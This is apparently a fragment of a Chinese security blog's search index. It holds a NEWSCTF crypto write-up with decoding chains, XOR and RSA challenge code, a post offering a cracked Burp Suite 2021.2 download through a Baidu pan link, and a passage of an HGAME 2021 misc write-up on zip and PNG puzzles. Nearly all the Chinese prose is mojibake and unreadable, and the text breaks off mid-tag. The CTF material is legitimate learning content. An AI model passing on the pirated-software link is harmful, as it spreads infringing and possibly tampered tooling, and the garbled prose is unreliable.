src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2257254310.png"></p><h1 id="0X3-Crypto"><a href="#0X3-Crypto" class="headerlink" title="0X3 Crypto"></a>0X3 Crypto</h1><h2 id="è´æ–¯å®¶æ—"><a href="#è´æ–¯å®¶æ—" class="headerlink" title="è´æ–¯å®¶æ—"></a>è´æ–¯å®¶æ—</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;gM&amp;7AOTKl:236b;HHIm&#x3D;&#39;%8*&#x3D;&#39;&#39;2q;FX]*&lt;,5Z\&gt;&#39;a(\&lt;*)(o:2&lt;mE;DL+19egH[A2@7[A28+B;L2)3;-,Jc&lt;EDpe@kpeS&#x3D;]Ipp@5)e@;FN&lt;1@VeM3&#x3D;tj,I&#x3D;u&#39;8;;FXDT@;BL0@o[bo&#x3D;]\dGA2?f&#39;&lt;CL(F@k&#96;.CASl6l:236V@Vo.c&gt;&amp;6JY@mipjA4Tls;&#x2F;:D4&#x3D;]I2%@PTof&lt;*)gK;eo9(@VeIr</span><br></pre></td></tr></table></figure><p>base85-&gt;base64-&gt;base32</p><h2 id="å¥½æ—¥å­"><a href="#å¥½æ—¥å­" class="headerlink" title="å¥½æ—¥å­"></a>å¥½æ—¥å­</h2><blockquote><p>å¥½æ—¥å­ï¼Œ11æœˆ11æ—¥</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â†—â†—â†â†–â†•â†–â†•â†³â†—â†°â†—â†ºâ†–â†’â†”â†°â†•â†™â†•â†ºâ†”â†°â†–â†—â†”â†–â†”â†‘â†”â†’â†â†‘â†–â†“â†—â†“â†â†”â†”â†—â†â†˜â†•â†–â†â†•â†•â†»â†—â†°â†•â†“â†–â†â†—â†²â†—â†‘â†—â†±â†—â†˜â†•â†”â†•â†»â†â†“â†”â†˜â†—â†•â†•â†”â†–â†‘â†–â†–â†—â†”â†—â†²â†”â†™â†—â†—â†—â†—â†”â†”â†•â†°â†”â†”â†•â†°â†–â†°â†”â†”â†—â†’â†•â†”â†—â†•â†–â†’â†•â†–â†•â†“â†–â†â†—â†°â†”â†‘â†—â†–â†•â†»â†â†•â†•â†•â†â†–â†—â†˜â†”â†”â†•â†”â†–â†’â†”â†°â†â†”â†–â†–â†–â†˜â†•â†±â†â†‘â†”â†°â†”â†—â†•â†˜â†•â†ºâ†â†’â†—â†–â†—â†²â†â†™&#x3D;</span><br></pre></td></tr></table></figure><p>ç™¾åº¦çœ‹çœ‹ç®­å¤´è§£å¯†å¯çŸ¥æ­¤ä¸º<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=jiantou">æ–‡æœ¬åŠ å¯†ä¸ºç®­å¤´ç¬¦å·</a>ï¼Œå¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">G6fmJNRzinzWvqr1SC4w8f5oJcPLAKHdo3xEdQVDLyGGtjtjZtBdERfcPJqFo5e6HtdRz4VXk1zwhn2FL9</span><br></pre></td></tr></table></figure><p>æ¥ç€base58å¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX19oI1ocbbcM5wensOuKarNA3noE&#x2F;HS74RNYqh0stoMpQohkLGqF</span><br></pre></td></tr></table></figure><p>ç„¶å<a href="http://www.jsons.cn/rabbitencrypt/">Rabbitè§£å¯†</a>ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥æ˜¯å®ƒ.jpgï¼‰å¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klv,oclz&#123;mkd_slp_vb_zjjs_slp&#125;</span><br></pre></td></tr></table></figure><p>æœ€å<a href="http://www.atoolbox.net/Tool.php?Id=911">ä»¿å°„å¯†ç </a>ï¼ˆæ ¹æ®é¢˜ç›®å…¨è®¾ç½®ä¸º11ï¼‰å¾—åˆ°flagï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;the_day_is_good_day&#125;</span><br></pre></td></tr></table></figure><h2 id="ä½ æ‡‚çŒªåœˆï¼Ÿ"><a href="#ä½ æ‡‚çŒªåœˆï¼Ÿ" class="headerlink" title="ä½ æ‡‚çŒªåœˆï¼Ÿ"></a>ä½ æ‡‚çŒªåœˆï¼Ÿ</h2><blockquote><p>çœ‹çœ‹å¯¹ç…§è¡¨å§</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cipherï¼š1101101011100000110110001110010011110110111100001100100011101000101111101101100011001110110111001011111011011000101111101101001011100000111001001111101</span><br><span class="line"></span><br><span class="line">flag&#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="easy-xor"><a href="#easy-xor" class="headerlink" title="easy_xor"></a>easy_xor</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from flag import flag</span><br><span class="line"></span><br><span class="line">flag&#x3D;bytes_to_long(flag)</span><br><span class="line">ans&#x3D;flag^(flag&lt;&lt;15)</span><br><span class="line">print(ans)</span><br><span class="line"></span><br><span class="line">#ans&#x3D;14569375211114495592988072883061872297563767589932067656113392860528203976417190082740661816716711081417186761262073489271425789667068315834063344130245403597447850801623941898977852694319512368707965</span><br></pre></td></tr></table></figure><p>å®˜æ–¹wp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;&quot;11000010111001111100010100011110011001111110010100011010010111010111001101010111011000011001110101010000010111111001000101010110011001111001010100001110010110010101110111101001010000000110111100000101111111010001101001100111111001010010101001011111100011010111011001000011011100110111011110010101000000100110111110001101011011000100101101000101010111111000100101000110011001111110010100111110010111110000111101011001100101010000010001011001010110110111111111110001010100000011000101011011011111110111001101101101001100110000010100000011000000111011111101110011011101110111001110101001101111100100010101001101000001110001110110010111111010110010111111100101111101&quot;</span><br><span class="line"></span><br><span class="line">def xor(a,b):</span><br><span class="line">    S&#x3D;&quot;&quot;</span><br><span class="line">    for i in range(0,len(a)):</span><br><span class="line">        if a[i]&#x3D;&#x3D;b[i]:</span><br><span class="line">            S+&#x3D;&quot;0&quot;</span><br><span class="line">        else:</span><br><span class="line">            S+&#x3D;&quot;1&quot;</span><br><span class="line">    return S</span><br><span class="line"></span><br><span class="line">flag&#x3D;s[len(s)-15:]</span><br><span class="line">iv&#x3D;flag</span><br><span class="line">N&#x3D;[iv]</span><br><span class="line">for i in range(647,17,-15):</span><br><span class="line">    iv&#x3D;xor(iv,s[i-15:i])</span><br><span class="line">    N.append(iv)</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(len(N)-1,-1,-1):</span><br><span class="line">    flag+&#x3D;N[i]</span><br><span class="line">print(&quot;11&quot;+flag)</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line">flag&#x3D;int(&quot;11000010111001100100000011010010111001100100000011010110110111001101111011101110110111000100000011101000110111100100000011101010111001100100000011000010110110001101100001011000111100001101111011100100010000001101001011100110010000001110011011011110010000001100101011000010111001101111001001011000111001101101111001000000110100001100101011100100110010100100000011010010111001100100000011110010110111101110101011100100010000001100110011011000110000101100111001110100110011001101100011000010110011101111011011110000110111101110010010111110110010101100001011100110111100101011111001001100110000101101110011001000101111101000110011101010111100101111101&quot;,2)</span><br><span class="line">print(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><h2 id="fan-si"><a href="#fan-si" class="headerlink" title="fan si"></a>fan si</h2><blockquote><p>çœŸçš„æ˜¯base32ï¼Œflag{}æœ‰ç”¨å“¦<br>Hint1ï¼šæ€»å…±åªæœ‰ä¸¤æ­¥<br>Hint2ï¼šé¢˜ç›®å°±æ˜¯ç¬¬ä¸€æ­¥ï¼Œfan siï¼Ÿ</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">72FVZ2II7KL4V2KQVKUXHWYXYW3F7WAONKUF7TYN72XFRED&#x3D;</span><br><span class="line"></span><br><span class="line">çœŸçš„æ˜¯base32ï¼Œä½†æ˜¯å¥½åƒåŠ¨äº†ä»€ä¹ˆæ‰‹è„šï¼Ÿ</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºå¯çŸ¥å…¶ä¸ºä»¿å°„å¯†ç </p><h2 id="EZ-RSA"><a href="#EZ-RSA" class="headerlink" title="EZ-RSA"></a>EZ-RSA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import sympy</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from flag import flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">z&#x3D;getPrime(1024)</span><br><span class="line">p&#x3D;sympy.nextprime(z)</span><br><span class="line">q&#x3D;sympy.prevprime(10*z)</span><br><span class="line">n&#x3D;p*q</span><br><span class="line"></span><br><span class="line">m&#x3D;bytes_to_long(flag)</span><br><span class="line">e&#x3D;0xe18e</span><br><span class="line">c&#x3D;pow(m,e,n)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#n&#x3D;0x2c404d87c6244ad1b44aabd95244d5deb3c93cf3bd798ba4624cd9f89c95e246aad9cbda463292c6ef3140d97c5c1e691c54095e75f56d61a1640decc83caccce52c957282949bed20105d4d67c2b4c3d4c15829657e246d899917022e6d4d07c4382bcc3b83376d7250d85088dc73b24d030f4625fb37c5405cee04ace903d68747035fd55946ad2eb807db0b0508fc24fd54185614ab18c83127b7aa48f9927cc1258f819e02c5d2db4074736e374616664a2b49d1ff3a3effc4af201f235af5193a6e9a0192bb39aad91c5291a1b53973a85bec5dbbb3350e6c344b445c71212938d56a0c99e571bd15356979c394f84398143033fc44eb40558f253bb2445</span><br><span class="line">#c&#x3D;0x73658446624aaccfefa351499ece4c4635f61ff9d9d9354236afbad3b9e4000582b192f92a6e7e96b60a8899610a841faee92cb38d0e195587977cb806ecb7e4ffe8772f34cec9e0957f28040466306fe5db43b96824aa45bbebed9c1dbf15ac13db238234b60b36bded6e137483b307296e76902a13914065004a289b2186777f1c93ca656a19e751d0e7cf8c090803242ccfe14746c43fe6785028cef6380c590d59ed3469f27ac1769fa2f7fe22eace6e9af1ee33f57b120dacddabbd09239bfc133e79945af9a01568aa1e44e79813fa2e9069fb755823c4bee745f6404c1a5b690f5ba5d52c9b783bd0dfc3a4d473e99879241c0453de76be0e72980d39</span><br></pre></td></tr></table></figure><h2 id="EZ-rsa2"><a href="#EZ-rsa2" class="headerlink" title="EZ_rsa2"></a>EZ_rsa2</h2><blockquote><p>so easy<br>Hint1ï¼šæœ‰é™åŸŸ n-th root<br>Hint2ï¼šåˆ«æ€¥ç€è½¬å­—ç¬¦ï¼Œçœ‹çœ‹æ•°å­—<br><a href="https://pan.baidu.com/s/1tmaRhaLdR4Zfqdm0yNESCQ">é™„ä»¶</a>ï¼ˆæå–ç ï¼š08ojï¼‰</p></blockquote><h2 id="RSAç®—æ³•"><a href="#RSAç®—æ³•" class="headerlink" title="RSAç®—æ³•"></a>RSAç®—æ³•</h2><blockquote><p>Hintï¼šx=0ä»£è¿›å»  å››ä¸ªèŠ‚ç‚¹ç¬¬ä¸€ä¸ªç§é’¥çš„å’Œå°±æ˜¯pï¼Œç¬¬äºŒä¸ªç§é’¥çš„å’Œå°±æ˜¯q<br><a href="https://pan.baidu.com/s/1nFaFSM7GzqdtUq_F1opeKw">é™„ä»¶</a>ï¼ˆæå–ç ï¼šmx47ï¼‰</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NEWSCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burp-2021-2ç ´è§£ç‰ˆä¸‹è½½</title>
      <link href="2021/02/10/burp-2021-2%E7%A0%B4%E8%A7%A3%E7%89%88%E4%B8%8B%E8%BD%BD/"/>
      <url>2021/02/10/burp-2021-2%E7%A0%B4%E8%A7%A3%E7%89%88%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ­¤æ¬¡ç‰ˆæœ¬æ›´æ–°å¦‚ä¸‹å†…å®¹ï¼ˆæ­¤ç‰ˆæœ¬æ”¹è¿›äº†æ¶ˆæ¯æ£€æŸ¥å™¨ã€éæ‰“å°å­—ç¬¦æ˜¾ç¤ºã€å¹³å°èº«ä»½éªŒè¯æ§ä»¶å’ŒåµŒå…¥å¼æµè§ˆå™¨ï¼‰</p><h1 id="è¯¦æƒ…å¦‚ä¸‹"><a href="#è¯¦æƒ…å¦‚ä¸‹" class="headerlink" title="è¯¦æƒ…å¦‚ä¸‹"></a>è¯¦æƒ…å¦‚ä¸‹</h1><h2 id="1-æä¾›äº†ä¸€ä¸ªæ–°çš„æ¼æ´å®šä¹‰å’Œå‡ ä¸ªbugä¿®æ­£"><a href="#1-æä¾›äº†ä¸€ä¸ªæ–°çš„æ¼æ´å®šä¹‰å’Œå‡ ä¸ªbugä¿®æ­£" class="headerlink" title="1.æä¾›äº†ä¸€ä¸ªæ–°çš„æ¼æ´å®šä¹‰å’Œå‡ ä¸ªbugä¿®æ­£"></a>1.æä¾›äº†ä¸€ä¸ªæ–°çš„æ¼æ´å®šä¹‰å’Œå‡ ä¸ªbugä¿®æ­£</h2><blockquote><p>æ–°çš„æ¼æ´å®šä¹‰ï¼šå½“ç›®æ ‡åº”ç”¨ç¨‹åºå¯¼å…¥å…·æœ‰å·²çŸ¥æ¼æ´çš„JavaScriptä¾èµ–é¡¹æ—¶ï¼Œæ˜“å—æ”»å‡»çš„JavaScriptä¾èµ–é¡¹ciesburp Scannerç°åœ¨å°†æ£€æµ‹åˆ°ï¼Œä¾‹å¦‚ï¼Œå½“ä¸€ä¸ªå›¾ä¹¦é¦†å·²ç»è¿‡æ—¶æˆ–æœ‰å…¶ä»–å±é™©æ—¶é—®é¢˜ã€‚é-æ‰“å°å­—ç¬¦æ”¹è¿›åœ¨æ–‡æœ¬ç¼–è¾‘å™¨ä¸­æŸ¥çœ‹éæ‰“å°å­—ç¬¦æ—¶ï¼Œåå…­è¿›åˆ¶ä»£ç ç‚¹ä½äº20çš„å­—ç¬¦å°†æ˜¾ç¤ºä¸ºå¸¦æœ‰åå…­è¿›åˆ¶ä»£ç çš„â€œè±å½¢â€ã€‚ç°åœ¨ï¼Œä»£ç ç‚¹ä»7Fåˆ°FFçš„å­—ç¬¦ä¹Ÿä¼šæ˜¾ç¤ºåœ¨åŒä¸€è¡Œä¸­è·¯ã€‚æ¯-å¹³å°èº«ä»½éªŒè¯çš„ä¸»æœºæ§ä»¶ç°åœ¨å¯ä»¥åœ¨æ¯ä¸ªä¸»æœºä¸Šæ‰“å¼€æˆ–å…³é—­å¹³å°èº«ä»½éªŒè¯ï¼ˆåœ¨â€œç”¨æˆ·é€‰é¡¹â€å’Œâ€œè¿æ¥â€é€‰é¡¹å¡ä¸‹ï¼‰åŸºæœ¬ä¿¡æ¯æ£€æŸ¥å™¨æ”¹è¿›æ¶ˆæ¯ä¸­çš„æ€§èƒ½æœ‰äº†æ˜¾è‘—çš„æ”¹è¿›æ£€æŸ¥å‘˜ã€‚æ­¤å¤–ï¼Œç”¨æˆ·ç°åœ¨å¯ä»¥æ°´å¹³è°ƒæ•´æ¶ˆæ¯æ£€æŸ¥å™¨çš„å¤§å°ï¼Œå¹¶åŒæ—¶é€‰æ‹©å¤šä¸ªæ¡ç›®ä¸€æ¬¡ï¼ŒåµŒå…¥æµè§ˆå™¨æ”¹è¿›ä¸å†å‘é€ç”±åµŒå…¥å¼Chromiumæµè§ˆå™¨æœ¬èº«è€Œä¸æ˜¯ç”¨æˆ·å‘èµ·çš„HTTPè¯·æ±‚ã€‚</p></blockquote><h2 id="2-Burpçš„åµŒå…¥å¼æµè§ˆå™¨å·²å‡çº§åˆ°Chromium-88-0-4324-150ã€‚"><a href="#2-Burpçš„åµŒå…¥å¼æµè§ˆå™¨å·²å‡çº§åˆ°Chromium-88-0-4324-150ã€‚" class="headerlink" title="2.Burpçš„åµŒå…¥å¼æµè§ˆå™¨å·²å‡çº§åˆ°Chromium 88.0.4324.150ã€‚"></a>2.Burpçš„åµŒå…¥å¼æµè§ˆå™¨å·²å‡çº§åˆ°Chromium 88.0.4324.150ã€‚</h2><h2 id="3-é”™è¯¯ä¿®å¤å’Œå°æ”¹è¿›æ­¤ç‰ˆæœ¬è¿˜æä¾›ä»¥ä¸‹é”™è¯¯ä¿®å¤å’Œå°æ”¹è¿›ï¼š"><a href="#3-é”™è¯¯ä¿®å¤å’Œå°æ”¹è¿›æ­¤ç‰ˆæœ¬è¿˜æä¾›ä»¥ä¸‹é”™è¯¯ä¿®å¤å’Œå°æ”¹è¿›ï¼š" class="headerlink" title="3.é”™è¯¯ä¿®å¤å’Œå°æ”¹è¿›æ­¤ç‰ˆæœ¬è¿˜æä¾›ä»¥ä¸‹é”™è¯¯ä¿®å¤å’Œå°æ”¹è¿›ï¼š"></a>3.é”™è¯¯ä¿®å¤å’Œå°æ”¹è¿›æ­¤ç‰ˆæœ¬è¿˜æä¾›ä»¥ä¸‹é”™è¯¯ä¿®å¤å’Œå°æ”¹è¿›ï¼š</h2><blockquote><p>å½“åœ¨macOSä¸Šå¤„äºå…¨å±æ¨¡å¼æ—¶ï¼ŒHTTPå†å²æ¶ˆæ¯è¿‡æ»¤å™¨ä¸å†é”™è¯¯åœ°æ‰“å¼€æ–°çª—å£ã€‚<br>æµå“åº”ç°åœ¨æ­£ç¡®åœ°æ˜¾ç¤ºåœ¨æ‰“å—ä¸­ç»§å™¨ã€‚<br>æ‰“å¼€ç°æœ‰é¡¹ç›®æ–‡ä»¶åï¼ŒåŸºäºRegexçš„ä¼šè¯éªŒè¯ä¸å†å¤±è´¥ã€‚<br>ç°åœ¨æ¿€æ´».burpæ–‡ä»¶å°†æ‰“å¼€burpå¹¶åŠ è½½è¯¥æ–‡ä»¶ï¼Œè€Œä¸æ˜¯å¯åŠ¨burpå¯åŠ¨å‘å¯¼ã€‚<br>â€œåˆ é™¤å­—èŠ‚â€ä¸Šä¸‹æ–‡èœå•é€‰é¡¹å·²æ¢å¤åˆ°Burpè§£ç å™¨ã€‚<br>æ¶ˆæ¯ç¼–è¾‘å™¨ç°åœ¨æ­£ç¡®åœ°ç”¨åŒå¼•å·çªå‡ºæ˜¾ç¤ºæ–‡æœ¬ã€‚<br>â€œæˆªè·å…³é—­â€æŒ‰é’®çš„é¢œè‰²ç°åœ¨ä¸é™„è¿‘çš„æŒ‰é’®åŒ¹é…ã€‚<br>å¤é€‰æ¡†ä¸­çš„æ ‡è®°ç°åœ¨åœ¨Burp extensionsä¸­æ­£ç¡®æ˜¾ç¤ºã€‚<br>åœ¨Burpå…¥ä¾µè€…ä¸­ä½¿ç”¨é›†ç¾¤ç‚¸å¼¹æ”»å‡»æ—¶ï¼Œå–æ¶ˆé€‰æ‹©â€œURL encode these charactersâ€æ˜¯ä¸ºäº†æœ‰æ•ˆè´Ÿè½½å¤„ç†è§„åˆ™å’Œå¤šä¸ªæœ‰æ•ˆè´Ÿè½½é›†ã€‚<br>Burpå¥—ä»¶ç°åœ¨åˆ©ç”¨äº†å¯ä»¥å‘é€åˆ°Chromiumå¼€å‘å·¥å…·çš„æœ€å¤§æ¶ˆæ¯å¤§å°ï¼Œå³100MBã€‚è¿™æ„å‘³ç€å¯ä»¥åŠ è½½æ›´å¤§çš„é¡µé¢èµ„æºã€‚<br>Burpå¥—ä»¶çš„MIMEç±»å‹åˆ†æç°åœ¨ä¸Chromiumçš„è¡Œä¸ºåŒ¹é…ã€‚å½“ä¸€ä¸ªå“åº”ä¸­å­˜åœ¨å¤šä¸ªå†…å®¹ç±»å‹å¤´æ—¶ï¼ŒBurpé€‰æ‹©æœ€åä¸€ä¸ªã€‚å¦‚æœæœ‰Content-Typeå¤´å’Œ<meta-http equiv="Content-Type">æ ‡è®°ï¼Œåˆ™Burpé€‰æ‹©Content-Typeå¤´ã€‚æ­¤æ›´æ”¹ä¼šå½±å“â€œä»£ç†â€å’Œâ€œç›®æ ‡â€é€‰é¡¹å¡ä¸­çš„MIMEç±»å‹ç­›é€‰å™¨ï¼Œä»¥åŠâ€œå“åº”æŸ¥çœ‹å™¨â€ä¸­çš„â€œæ¸²æŸ“â€é€‰é¡¹å¡ã€‚<br>ä¸¥é‡æ€§ä¸ºå‡é˜³æ€§çš„æ¼æ´å›¾æ ‡å·²ä»è“è‰²å˜ä¸ºç»¿è‰²ã€‚</p></blockquote><h1 id="ä½¿ç”¨æˆªå›¾"><a href="#ä½¿ç”¨æˆªå›¾" class="headerlink" title="ä½¿ç”¨æˆªå›¾"></a>ä½¿ç”¨æˆªå›¾</h1><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/54147480.png"></p><p>ç¬”è€…åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°jdk13 ä¸è¡Œï¼Œåˆç”¨äº†jdk11</p><h1 id="èµ„æºåˆ†äº«"><a href="#èµ„æºåˆ†äº«" class="headerlink" title="èµ„æºåˆ†äº«"></a>èµ„æºåˆ†äº«</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps:<span class="comment">//pan.baidu.com/s/1xzIuCkm9E9uiKNJJGwYZcQæå–ç ï¼šwfoo å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦--æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜V3çš„åˆ†äº«</span></span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæˆ‘æŠŠjdk11çš„å®‰è£…åŒ…ä¹Ÿæ”¾è¿›å»äº†ï¼Œæ˜¯ä¸æ˜¯å¾ˆè´´å¿ƒï¼Ÿ</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…·æ¨é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME 2021 WEEK1</title>
      <link href="2021/02/07/2021HGAMEWEEK1/"/>
      <url>2021/02/07/2021HGAMEWEEK1/</url>
      
        <content type="html"><![CDATA[<h1 id="0X1Misc"><a href="#0X1Misc" class="headerlink" title="0X1Misc"></a>0X1Misc</h1><h2 id="1-Baseå…¨å®¶ç¦"><a href="#1-Baseå…¨å®¶ç¦" class="headerlink" title="1.Baseå…¨å®¶ç¦"></a>1.Baseå…¨å®¶ç¦</h2><blockquote><p>æ–°å¹´å³å°†æ¥ä¸´ä¹‹é™…ï¼ŒBaseå®¶æ—ä¹Ÿå›¢èšäº†ï¼Œä»–ä»¬ç”¨ä»–ä»¬ç‰¹æœ‰çš„æ‰“æ‹›å‘¼æ–¹å¼å‘ä½ é—®äº†ä¸ªå¥½ï¼Œä½ çŸ¥é“ä»–ä»¬åœ¨è¯´ä»€ä¹ˆå—ï¼Ÿ R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09</p></blockquote><p>base64-&gt;base32-&gt;base16</p><h2 id="2-ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•"><a href="#2-ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•" class="headerlink" title="2.ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•"></a>2.ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•</h2><blockquote><p>0x4qEç»™äº†å¼ å›¾ç»™æˆ‘ï¼Œè¯´è¿™å›¾æš—è—ç„æœºï¼Œä½ èƒ½å¸®æˆ‘æ‰¾å‡ºæ¥å—ï¼Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3802484613.png"></p></blockquote><p>å¾ˆæ˜æ˜¾æ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œæ‰“å¼€å‘ç°åŠ å¯†äº†~æç¤ºå¦‚ä¸‹</p><blockquote><p>é”˜ç¸‹assword is picture ID (Up to 8 digits)</p></blockquote><p>çŒœæµ‹å¯†ç ä¸ºå…¶Pç«™IDï¼Œè¯†å›¾å¾—åˆ°å…¶IDï¼š70415155ï¼ŒæˆåŠŸè§£å‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;graph.baidu.com&#x2F;s?sign&#x3D;12672a6df695e369823b901612610051&amp;f&#x3D;all&amp;tn&#x3D;pc&amp;tn&#x3D;pc&amp;srcp&#x3D;&amp;idctag&#x3D;gz&amp;sids&#x3D;10006_10802_10902_10913_11004_10924_10903_10018_10901_10942_10907_11013_10971_10966_10974_11032_12201_16201_17114_17850_17070_18013_18102_19002_19107_18240&amp;logid&#x3D;851833886&amp;pageFrom&#x3D;graph_upload_pcshitu&amp;extUiData%5BisLogoShow%5D&#x3D;1&amp;tpl_from&#x3D;pc&amp;entrance&#x3D;general</span><br></pre></td></tr></table></figure><p>æ–‡æœ¬æç¤ºå¦‚ä¸‹</p><blockquote><p>Sometimes we donâ€™t need to care about password.<br>Because itâ€™s too strong or null. XD<br>By the way, I only use storage.</p></blockquote><p>plain-&gt;æ˜æ–‡æ”»å‡»å¾—åˆ°å¯†ç ï¼šC8uvP$DP</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/731862508.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2319541266.png"></p><p>æ¥ç€åˆæ˜¯ä¸€å±‚åŠ å¯†ï¼šä¼ªåŠ å¯†ï¼Œ09-&gt;00ï¼ŒæˆåŠŸè§£å‹ï¼Œå°†flag.txtæ”¾å…¥010å¾—åˆ°</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3523275955.png"></p><p>æœ€åhtmlè§£ç å¾—åˆ°flag<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3322543382.png"></p><h2 id="3-Galaxy"><a href="#3-Galaxy" class="headerlink" title="3.Galaxy"></a>3.Galaxy</h2><blockquote><p>Akiraçš„ä¿¡ç‰©ï¼šç”¨äºæå‡Akiraçš„æ½œèƒ½ã€‚ä¸€å¼ è—ç€ç§˜å¯†çš„æ˜Ÿç©ºå£çº¸ï¼Œä¸å¹¸çš„æ˜¯ä¼¼ä¹åœ¨æŸæ¬¡è¡ŒåŠ¨ä¸­é—å¤±äº†ã€‚</p><p><a href="https://blog.harvey.plus/usr/uploads/2021/2/galaxy_a123bd9c2edcc8439575cacdf2afe352.pcapng"><strong>é™„ä»¶</strong></a></p></blockquote><p>httpä¸‹å‘ç°pngï¼Œå°†å…¶å¯¼å‡º</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1850788702.png"></p><p>æ¥ç€010æ‰“å¼€å‘ç°æ¨¡æ¿ä¼šæŠ¥CRC mismatchï¼Œå…¶åŸå› å°±æ˜¯å›¾ç‰‡é«˜åº¦ä¸æ­£ç¡®å¯¼è‡´trunk0CRCæ ¡éªŒå¤±æ•ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2315278038.png"></p><p>äºæ˜¯ä¹è·‘è„šæœ¬ä¿®æ”¹é«˜åº¦å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/987405351.png"></p><p><img 